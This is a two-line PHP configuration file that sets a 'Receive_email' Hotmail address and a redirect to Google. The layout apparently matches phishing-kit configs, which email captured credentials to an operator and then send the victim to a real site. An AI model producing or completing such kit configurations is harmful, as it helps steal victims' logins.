<?php 
$Receive_email="tecno55@hotmail.com";
$redirect="https://www.google.com/";
?>